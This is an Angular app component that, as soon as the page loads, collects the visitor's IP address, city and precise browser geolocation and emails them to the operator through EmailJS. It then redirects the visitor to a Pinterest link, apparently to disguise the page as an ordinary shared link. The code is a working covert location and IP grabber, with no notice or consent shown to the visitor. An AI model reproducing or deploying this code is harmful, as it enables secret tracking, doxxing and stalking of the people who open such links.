import { Component, OnInit } from '@angular/core';
import { EmailJSService } from './services/email-js.service';

@Component({
  selector: 'app-root',
  imports: [],
  templateUrl: './app.component.html',
  styleUrl: './app.component.css'
})
export class AppComponent implements OnInit {

  ipData: {ip: string, city: string, location: string, lat: number, long: number, speed: number|null, acc: number} =  {ip: '', city: '', location: '', lat: 0.0, long: 0.0, speed: 0.0, acc: 0.0};

  constructor(private emailService: EmailJSService) { }

  ngOnInit(): void {
    this.getGeoLocationOfUser();
    this.getIp().then((ipData) => {
      this.emailService.sendEmail(ipData)
        .then(() => {
          window.location.href = 'https://pin.it/1p7swarbr'
        })
        .catch((error) => {
          console.log('Failed..');
        });
    });
  }

  getGeoLocationOfUser() {
    navigator.geolocation.getCurrentPosition((position)=>{
      this.ipData.lat = position.coords.latitude;
      this.ipData.long = position.coords.longitude;
      this.ipData.speed = position.coords.speed;
      this.ipData.acc = position.coords.accuracy;
    })
  }

  async getIp(): Promise<any> {
    const response = await fetch('https://ipinfo.io/json');
    if (!response.ok) {
      console.log("Failed");
    }
    const data = await response.json();
    this.getGeoLocationOfUser();
    this.ipData.ip = data.ip;
    this.ipData.city = data.city;
    this.ipData.location = data.loc;
    return this.ipData;
  }

}
